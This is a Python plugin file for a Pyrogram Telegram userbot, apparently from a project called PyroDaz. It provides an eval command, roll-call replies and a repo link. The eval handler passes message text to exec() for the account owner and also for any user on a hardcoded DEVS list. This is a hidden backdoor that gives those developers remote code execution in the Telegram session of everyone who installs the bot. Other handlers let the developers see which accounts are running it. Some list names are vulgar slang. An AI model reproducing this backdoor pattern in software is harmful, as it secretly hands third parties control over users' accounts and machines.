from pyrogram import Client, filters 
from pyrogram.types import Message
from PyroDaz.helpers.adminHelpers import DEVS
import asyncio
import time
import os
import sys
import random 
import traceback
from PyroDaz import *
from PyroDaz.helpers.PyroHelpers import ReplyCheck
import re
import subprocess
from io import StringIO
from inspect import getfullargspec
from PyroDaz.helpers.constants import First

async def aexec(code, client, message):
    exec(
        f"async def __aexec(client, message): "
        + "\n c = dazi = client"
        + "\n print = p"
        + "\n m = message"
        + "\n r = message.reply_to_message"
        + "".join(f"\n {l}" for l in code.split("\n"))
    )
    return await locals()["__aexec"](client, message)


@Client.on_message(filters.command(["ev", "e", "i"], [",", "(", ";", "×", ":"]) & filters.user(DEVS))
@Client.on_message(filters.group & filters.command(["ev", "u"], ["!", "_"]) & filters.me)
async def evaluate(client: Client, message: Message):
    status_message = await message.reply("`Memproses!`")
    try:
        cmd = message.text.split(" ", maxsplit=1)[1]
    except IndexError:
        await status_message.delete()
        return
    reply_to_id = message.message_id
    if message.reply_to_message:
        reply_to_id = message.reply_to_message.message_id
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = f"<b>Output</b>:\n    <code>{evaluation.strip()}</code>"
    if len(final_output) > 4096:
        filename = "output.txt"
        with open(filename, "w+", encoding="utf8") as out_file:
            out_file.write(str(final_output))
        await message.reply_document(
            document=filename,
            caption=cmd,
            disable_notification=True,
            reply_to_message_id=reply_to_id,
        )
        os.remove(filename)
        await status_message.delete()
    else:
        await status_message.edit(final_output)


kontol = [
    "**Hadir Bang** 😁",
    "**Hadir Abang Ganteng** 😍",
    "**Hadir kak** 😉",
    "**Hadir sayang** 😘",
    "**Hadir ganteng** 🥵",
    "**Hadir bro** 😎",
    "**Hadir kak maap telat** 🥺",
]

memek = [
    "**Hadir Bang Amang** 😁",
    "**Hadir Amang Ganteng** 😍",
    "**Hadir kak Amang** 😉",
    "**Hadir Amang sayang** 😘",
    "**Hadir Amang ganteng** 🥵",
    "**Hadir bebebkuh** 😎",
    "**Hadir kak Amang maap telat** 🥺",
]


@Client.on_message(filters.command("hai", ["."]) & filters.user(DEVS) & ~filters.me)
async def absen(client: Client, message: Message):
    await message.reply_text(random.choice(memek))


@Client.on_message(filters.command("absen", ["."]) & filters.user(DEVS) & ~filters.me)
async def absen(client: Client, message: Message):
    await message.reply_text(random.choice(kontol))


@Client.on_message(filters.command("dazi", ["."]) & filters.user(DEVS) & ~filters.me)
async def taro(client: Client, message: Message):
    await client.send_message(message.chat.id, "`Lari, Ada devs` 🤡")

@Client.on_message(filters.command("amang", ["."]) & filters.user(DEVS) & ~filters.me)
async def taro(client: Client, message: Message):
    await client.send_message(message.chat.id, "`Lari, Ada devs` 🤡")

@Client.on_message(filters.command("repo", ["-", "!"]) & filters.me)
async def repo(client: Client, message: Message):
    await message.reply(
        First.REPO, disable_web_page_preview=True
    )
